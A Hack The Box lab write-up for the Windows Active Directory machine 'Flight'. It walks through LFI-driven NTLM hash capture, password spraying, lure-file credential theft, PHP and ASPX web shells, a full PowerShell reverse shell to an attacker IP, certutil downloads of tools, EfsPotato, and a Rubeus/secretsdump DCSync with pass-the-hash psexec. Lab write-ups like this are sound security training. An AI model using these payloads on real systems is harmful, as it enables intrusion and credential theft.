---
title: flight
published: 2025-09-29
description: 'Flight HTB hard machine writeup'
tags: [HTB, AD, Machines]
category: 'Machines'
image: ../../assets/flight/front.png
draft: false 
lang: 'en'
---

# HTB — Flight

## Description

Flight is a challenging Windows Active Directory (AD) machine themed around an airline. The machine exposes an Apache/PHP vhost and multiple AD services. The initial foothold comes from a local file inclusion (LFI) vector on a vhost which is abused to coerce the webserver into authenticating to an attacker-controlled SMB server, allowing capture of an NTLM hash. After cracking the hash and exploiting password reuse, we gain SMB access with limited accounts. With write access to a web share we can upload a web shell to the PHP site and obtain a shell as `svc_apache`. From there we escalate by abusing IIS application pool privileges — first via an EfsPotato (SeImpersonatePrivilege) to get SYSTEM, and alternatively by extracting the machine TGT (via Rubeus), converting it to a ccache, and performing a DCSync (secretsdump) to obtain the Administrator NT hash and psexec to get SYSTEM. Overall the box demonstrates web LFI → NTLM relay/hash capture → credential reuse → SMB/webupload → local privilege escalation via impersonation and Kerberos abuse.

---

# Enumeration

We start as usual with an nmap scan:

```bash
sudo nmap -sC -sV -oA Flight 10.129.228.120

# Nmap 7.92 scan initiated Thu Sep 25 12:46:11 2025 as: nmap -sC -sV -oA Flight 10.129.228.120
Nmap scan report for 10.129.228.120
Host is up (0.099s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-25 18:46:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-25T18:46:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 25 12:47:26 2025 -- 1 IP address (1 host up) scanned in 74.69 seconds
```

We notice this is a typical domain controller named `G0`, and there is an Apache web server running PHP.  
First, let's add the domain and DC subdomain to `/etc/hosts`:

```bash
$ cat /etc/hosts

...
10.129.228.120	flight.htb GO.flight.htb 
```

![](src/assets/flight/Flight_image_1.png)

Browsing the website shows it is a static site; we couldn't retrieve anything useful from it.

Let's check for other vhosts using ffuf:

```bash
$ ffuf -w ~/work/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://flight.htb -H 'Host:FUZZ.flight.htb'

...
origin                  [Status: 200, Size: 7069, Words: 1546, Lines: 155]
b2b                     [Status: 200, Size: 7069, Words: 1546, Lines: 155]
internal                [Status: 200, Size: 7069, Words: 1546, Lines: 155]
domain                  [Status: 200, Size: 7069, Words: 1546, Lines: 155]
autodiscover.dev        [Status: 200, Size: 7069, Words: 1546, Lines: 155]
barracuda               [Status: 200, Size: 7069, Words: 1546, Lines: 155]
m2                      [Status: 200, Size: 7069, Words: 1546, Lines: 155]
dc                      [Status: 200, Size: 7069, Words: 1546, Lines: 155]
...
```

```bash
$ ffuf -w ~/work/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://flight.htb -H 'Host:FUZZ.flight.htb' -fs 7069

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://flight.htb
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 7069
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91]
```

We found another subdomain, added it to `/etc/hosts`, and navigated to it.

![](src/assets/flight/Flight_image_2.png)

On the home page we see that `index.php` takes a `view` parameter and uses it directly as a file name. This is a strong indication the site may be vulnerable to LFI.

![](src/assets/flight/Flight_image_3.png)

A simple path traversal attempt gives a warning message. We could try path-escaping techniques, but a better approach is to read the `index.php` source.

![](src/assets/flight/Flight_image_4.png)

```php
<?php

ini_set('display_errors', 0);
error_reporting(E_ERROR \ E_WARNING \ E_PARSE);

if(isset($_GET['view'])){
$file=$_GET['view'];
if ((strpos(urldecode($_GET['view']),'..')!==false)\
(strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)\
(strpos(urldecode($_GET['view']),'\\')!==false)\
(strpos(urldecode($_GET['view']),'htaccess')!==false)\
(strpos(urldecode($_GET['view']),'.shtml')!==false)
){
echo "<h1>Suspicious Activity Blocked!";
echo "<h3>Incident will be reported</h3>\r\n";
}else{
echo file_get_contents($_GET['view']);
}
}else{
echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
}

?>
```

The script uses `file_get_contents` on the `view` parameter after performing some filtering. Because this is a Windows host, we can try to read a file via an SMB path (UNC). When Windows tries to access a UNC path, it will attempt to authenticate using the account running the web server, which allows us to capture an NTLM hash by hosting an SMB share.

---

# Exploitation

## First account — capture Apache service hash

I set up impacket's `smbserver.py`:

```bash
smbserver.py -smb2support -port 4444 -debug share ./

[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib64/python3.12/site-packages/impacket
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed

```

Then I pointed the `view` parameter at my SMB share (UNC path). The server connected back and we captured a hash.

![](src/assets/flight/Flight_image_5.png)

Captured hash (svc_apache):

```
svc_apache::flight:aaaaaaaaaaaaaaaa:472854dc6a979be9babff05aba9d068e:01010000000000008020df1fa82fdc01b5dcbab4af2408af00000000010010007a00750079006f0070004b0066006300030010007a00750079006f0070004b00660063000200100063007100590078006f0078007a0077000400100063007100590078006f0078007a007700070008008020df1fa82fdc01060004000200000008003000300000000000000000000000003000004bf24e00d458fe45022a3b5ffc08d431d09c9cecc269faeaeeafd89f7b982dc30a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370036000000000000000000
```

I cracked it with hashcat:

```bash
hashcat -m 5600 ntlm_svc_apache ~/work/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

The cracked password is: `S@Ss!K@*t13`.

Verify the creds with netexec:

```bash
netexec smb GO.flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13'               
SMB         10.129.70.43    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.70.43    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13
```

Enumerate shares:

```bash
netexec smb GO.flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' --shares
SMB         10.129.70.43    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.70.43    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.70.43    445    G0               [*] Enumerated shares
SMB         10.129.70.43    445    G0               Share           Permissions     Remark
SMB         10.129.70.43    445    G0               -----           -----------     ------
SMB         10.129.70.43    445    G0               ADMIN$                          Remote Admin
SMB         10.129.70.43    445    G0               C$                              Default share
SMB         10.129.70.43    445    G0               IPC$            READ            Remote IPC
SMB         10.129.70.43    445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.70.43    445    G0               Shared          READ            
SMB         10.129.70.43    445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.70.43    445    G0               Users           READ            
SMB         10.129.70.43    445    G0               Web             READ            
```

The shares are readable but didn't immediately contain useful information. With an AD account, we listed users:

```bash
$ netexec smb GO.flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' --users > users_tmp
$ cat users_tmp | awk -F ' ' '{print $5}'

Administrator
Guest
krbtgt
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
```

I looked for kerberoastable and AS-REP roastable users but didn't find anything useful there.

---

## Second account — password spraying / password reuse

I performed a simple password spray using `svc_apache`'s password against the discovered users:

```bash
netexec smb GO.flight.htb -u users -p 'S@Ss!K@*t13'
SMB         10.129.70.43    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.70.43    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
```

The user `S.Moon` had the same password (`S@Ss!K@*t13`). I enumerated shares with those credentials.

---

## Third account — gained write access

```bash
netexec smb GO.flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13' --shares             
SMB         10.129.70.43    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.70.43    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.70.43    445    G0               [*] Enumerated shares
SMB         10.129.70.43    445    G0               Share           Permissions     Remark
SMB         10.129.70.43    445    G0               -----           -----------     ------
SMB         10.129.70.43    445    G0               ADMIN$                          Remote Admin
SMB         10.129.70.43    445    G0               C$                              Default share
SMB         10.129.70.43    445    G0               IPC$            READ            Remote IPC
SMB         10.129.70.43    445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.70.43    445    G0               Shared          READ,WRITE      
SMB         10.129.70.43    445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.70.43    445    G0               Users           READ            
SMB         10.129.70.43    445    G0               Web             READ            
```

We have write access to the `Shared` share. When you have write access to a share, a common technique is to place files that cause an interactive user (or a service) to access them, thereby leaking their credentials to an attacker-controlled server (NTLM theft). I used `ntlm_theft` to generate various lure files.

```bash
python ntlm_theft.py --generate all --server 10.10.14.102 --filename theft

Created: theft/theft.scf (BROWSE TO FOLDER)
Created: theft/theft-(url).url (BROWSE TO FOLDER)
...
```

I uploaded `desktop.ini` (or another generated lure) to the `Shared` share, which caused a connection and yielded a captured hash. I cracked the hash with hashcat and got credentials for `C.Bum`:

```
C.Bum: Tikkycoll_431012284
```

Verified with netexec:

```bash
$ netexec smb GO.flight.htb -u 'C.Bum' -p 'Tikkycoll_431012284'   
          
SMB         10.129.70.43    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.70.43    445    G0               [+] flight.htb\C.Bum:Tikkycoll_431012284
```

Enumerating shares as `C.Bum`:

```bash
netexec smb GO.flight.htb -u 'C.Bum' -p 'Tikkycoll_431012284' --shares
... 
SMB         10.129.70.43    445    G0               Shared          READ,WRITE      
...
SMB         10.129.70.43    445    G0               Web             READ,WRITE
```

This time, `C.Bum` has write access to the `Web` share. I listed it:

```bash
smbclient -U 'C.Bum' '\\GO.flight.htb\Web'
Password for [SAMBA\C.Bum]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep 29 09:02:32 2025
  ..                                  D        0  Mon Sep 29 09:02:32 2025
  flight.htb                          D        0  Mon Sep 29 09:02:01 2025
  school.flight.htb                   D        0  Mon Sep 29 09:02:01 2025
```

Since the web server uses PHP, I uploaded a PHP web shell and executed commands.

Create a simple web shell:

```bash
echo '<?php echo system($_GET["cmd"]); ?>' > lol.php
```

Upload it to the `school.flight.htb` folder:

```bash
smb: \school.flight.htb\> put lol.php
putting file lol.php as \school.flight.htb\lol.php (0.1 kb/s) (average 0.1 kb/s)
smb: \school.flight.htb\> 
```

Trigger the web shell:

![](src/assets/flight/Flight_image_6.png)

I executed a PowerShell reverse shell payload. The payload was encoded as base64 (UTF-16LE):

```bash
$ payload='$Dude = New-Object System.Net.Sockets.TCPClient("10.10.14.102",1337);$subssss = $Dude.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($iij = $subssss.Read($bytes, 0, $bytes.Length)) -ne 0){;$definitlynotdata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $iij);$sforward = (iex $definitlynotdata 2>&1 | Out-String );$sforward2  = $sforward + "> ";$dontsBt = ([text.encoding]::ASCII).GetBytes($sforward2);$subssss.Write($dontsBt,0,$dontsBt.Length);$subssss.Flush()};$Dude.Close()'

$ echo $payload |iconv -t utf-16le |base64 -w0|tr -d '\n'
# ... base64 output ...
```

Then I invoked it via the web shell:

```bash
curl 'http://school.flight.htb/lol.php?cmd=powershell%20-e%20JABEAHUAZ<payload-base64>'
```

On my listener:

```bash
$ rlwrap nc -nlvp 1337

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.129.70.43.
Ncat: Connection from 10.129.70.43:61921.

whoami
flight\svc_apache
```

We have a shell as `flight\svc_apache`.

---

## Shell as C.Bum

Using `RunasCS` ([https://github.com/antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs)), I ran a process as `C.Bum` using the captured credentials:

```powershell
./runascs.exe C.Bum Tikkycoll_431012284 powershell -r 10.10.14.102:4443
[*] Warning: The logon for user 'C.Bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-73ca1$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 1384 created in background.
```

Listener:

```bash
rlwrap nc -nlvp 4443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443
Ncat: Connection from 10.129.70.43.
Ncat: Connection from 10.129.70.43:61939.
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
flight\c.bum
PS C:\users\c.bum\desktop> type user.txt
type user.txt
2877ad031c95273c0c79fd1db745fe07
```

We now have the user flag.

---

# Privilege Escalation

Inspecting open ports showed UDP 8000 listening on the host (it wasn't visible from the outside in the initial nmap; likely bound to loopback). To access it, I used `chisel` to create a reverse tunnel.

First, download `chisel.exe` on the target with `certutil`:

```powershell
certutil -urlcache -split -f http://10.10.14.102:8089/chisel.exe chisel.exe
```

On the attack machine, start chisel server in reverse mode:

```bash
./chisel server -p 8001 --reverse

2025/09/28 03:27:52 server: Reverse tunnelling enabled
2025/09/28 03:27:52 server: Fingerprint jjdM7hbqLmkOn0LfMv13NqW+KVlntnwtk5snAawaYX4=
2025/09/28 03:27:52 server: Listening on http://0.0.0.0:8001
```

Connect from the pivot host back to the server to expose local port 8000:

```powershell
PS C:\users\c.bum> ./chisel.exe client 10.10.14.102:8001 R:8002:127.0.0.1:8000

2025/09/29 15:35:08 client: Connecting to ws://10.10.14.102:8001
2025/09/29 15:35:08 client: Connected (Latency 80.274ms)
```

Now I visited the tunneled site at `http://127.0.0.1:8002/`.

![](src/assets/flight/Flight_image_7.png)

Navigating to a non-existent directory revealed an IIS-style error page:

![](src/assets/flight/Flight_image_8.png)

While web enumeration of this site didn't immediately yield sensitive info, I continued system enumeration.

I found `C:\inetpub\development`, which contains files resembling this site. Checking ACLs:

```powershell
icacls C:\inetpub\development
C:\inetpub\development flight\C.Bum:(OI)(CI)(W)
                       NT SERVICE\TrustedInstaller:(I)(F)
                       NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
                       NT AUTHORITY\SYSTEM:(I)(F)
                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                       BUILTIN\Administrators:(I)(F)
                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                       BUILTIN\Users:(I)(RX)
                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

`C.Bum` has write access to this website directory. Since the site runs on IIS, I can drop an ASPX shell.

I used the Laudanum aspx shell:

```bash
git clone https://gitlab.com/kalilinux/packages/laudanum.git

# Copy it to the python webserver directory
cp ~/tools/laudanum/aspx/shell.aspx .
```

Downloaded it to the target development dir:

```powershell
PS C:\inetpub\development> certutil -urlcache -split -f http://10.10.14.102:8089/shell.aspx shell.aspx
```

Visited `http://127.0.0.1:8002/shell.aspx` and got a web shell.

![](src/assets/flight/Flight_image_9.png)

I used the same reverse-shell technique as before to obtain a shell as `IIS APPPOOL\DefaultAppPool` (the application pool identity).

---

## Privilege escalation — Method 1 (EfsPotato / SeImpersonatePrivilege)

Check the current account and privileges:

```powershell
> whoami 
iis apppool\defaultapppool
> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled 
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` is enabled, so I used an available “potato” exploit. I used `EfsPotato` (one of the variants that works frequently).

Download `EfsPotato.cs` from the repository and compile with `csc`:

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs

efspotato.cs(123,29): warning CS0618: 'System.IO.FileStream.FileStream(System.IntPtr, System.IO.FileAccess, bool)' is obsolete: 'This constructor has been deprecated.  Please use new FileStream(SafeFileHandle handle, FileAccess access) instead, and optionally make a new SafeFileHandle with ownsHandle=false if needed.  http://go.microsoft.com/fwlink/?linkid=14202'
```

Warnings can be ignored. Running it:

```powershell
> ./efspotato.exe whoami

[+] Current user: IIS APPPOOL\DefaultAppPool
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=133c3f0)
[+] Get Token: 732
[!] process with pid: 2112 created.
==============================
nt authority\system
```

We have SYSTEM. From here we can read the Administrator flag or spawn a SYSTEM shell.

---

## Privilege escalation — Method 2 (machine TGT & DCSync)

An alternative is to abuse the machine account. On domain-joined systems, the application pool's virtual account (e.g., `DefaultAppPool`) may be able to request a TGT for the machine account. With Rubeus, we can extract a TGT (kirbi), convert it into a ccache, and use it to perform a DCSync (secretsdump) to retrieve domain credentials, including Administrator's hash.

Request a delegation TGT with Rubeus:

```powershell
./rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: +Bq/MxJ2UaPKDLsBUJAv3fThr1FOrKr1Sr/BWXCGRUk=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECugDBpTZsmiuv4CjIpupnJWc0rqK763EZzn1+pnchDf5oYdpV4CC+UyfVViWSKAGVHHDyTrAWDCfaBtp1z12mKsKnak1SbTfvPWGX40o1OQPLC9vwVxQghj3D2CNjPKqnG0soHwW4mnM+JNcPn8RkAzi0sZSY6EufB+25C1eI90Yex7nGBy6SAhifTKzcraiPorNndDT4cqYMk6sFtt0OPQxwZ+kcOQ5LOjnP1iJa5bzOhtncEfdgGF39lYwUr0V3j9aejlNUyLENMiWnRIxdAmvgO5CBEINrbua1Es5JbbtIiF+zHELSE+HaNs665tzFMxEVgcbBQe7i1cWUgvmYoqoI/RfwVnd5avuQ4YMSJkMoxBLnSkrzZonG5Qadn1Ef9VYZPVcL8cwHdVZ35Wm45DaP06XUtBpBRloyQmbQzBGi1kmc+HELNoyd+TGMtT7KIpQFzJnj5C25aUFBKAVapGtrxjzqVtkt1SdKySWlYkYYPNV5+QwNxIOZ+kJsJ7mu8qnSB896ywL3uZ90e49JKC07qP9Rint5cdXWa+THz14X3h7hDHWD7Dc/jOBcR55sMf5qL4YH1M1tcmg8z4UXw+LMXUmgiMO5CgZZc7fjX10BIGNQz81h1Epkgyy8+ziWvfXrc9cGzceQVT4qOhPRhjLO0JibRkZE0t3ywtxoqa1UtKntz0WBMhJb6JG9mVuDTNTJn20epKm2o1+/fYK0Di1q7nEY8GKTaU7LESTtk2us/8wVfxlZVcUZvrPQSSy+r0ym82jfdr7vaGzJZJzD7vBIDIcdJBmv1KFkPPEWyGM5xurQvkUYt+/e0RIVk3/EcEj9ybTPfvI1tWubBV7SLpsTseL+2h8/eOMu2S9ulAzdkmnDVc9uhm++4mKSvucpZcG0f4MTlshge9rRNyclkWZ/4D7H3Eu7jDFHJ7YZGpUVUw851yOWNxjtURTBNxCdkhg4CY6Ukdu/fmWaBL8UMpuJUuqbN1Hj29tU9rfYeLvDW0BQWypNS8RbKHhDKZ9yEpodRo/vMa0blBvId4nLTBz0dITv8jX0Lp3qM25BG8zQEnnSGcZP3QmEro4/i//ocGJ/QQ9YujxZ/0eEb9122f9ZY8cp7t/PQFKhgMYPUsQzPeJUuAKoHZX9fiWkZkwFTMW70B0aYiPEshApe7vHOc60QduBqWKC70aTVcCXtjwvkDctJHetsRDYAou5upwcphgWPizINeOG2mebl7BnURbRk9mzvI3c0av9m5apM3fsTt8ZxSiWqOju4h4+8Ao7nQuHKe5cSZnLrJurehbYykX2hk4VRtdgCdV4nyllfUpHmweMFIkETzqjqrHsG6+I7PYh9W5Uup0sw0ESrbUBk9q6DnK3zJXAqLxo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQg1fV/VpdntCldaoAozKofrfpXVGidr5ZqHu1KEFCQpjChDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MDkyOTIzMTg0OFqmERgPMjAyNTA5MzAwODU2MDFapxEYDzIwMjUxMDA2MjI1NjAxWqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
```

Save the base64 to a file, decode to a `tgt` file and convert to a ccache:

```bash
$ cat tgt_base64 | base64 -d > tgt
$ kirbi2ccache tgt system.ccache
INFO:root:Parsing kirbi file /home/whydude230/work/HackTheBox/Machines/Flight/tgt
INFO:root:Done!
$ export KRB5CCNAME=system.ccache
```

Use the ccache with `secretsdump.py` to perform a DCSync (or dump NTDS) without knowing the Administrator password:

```bash
secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c::: [*] Kerberos keys grabbed
...
```

With the Administrator hash obtained, I used `psexec.py` to get a SYSTEM shell:

```powershell
rlwrap -cAr psexec.py administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on flight.htb.....
[*] Found writable share ADMIN$
[*] Uploading file HsoSTyOS.exe
[*] Opening SVCManager on flight.htb.....
[*] Creating service QOxZ on flight.htb.....
[*] Starting service QOxZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type c:\users\administrator\desktop\root.txt
682dfd0c9249d11a2bb02a74768714b6
```

We have the Administrator flag.
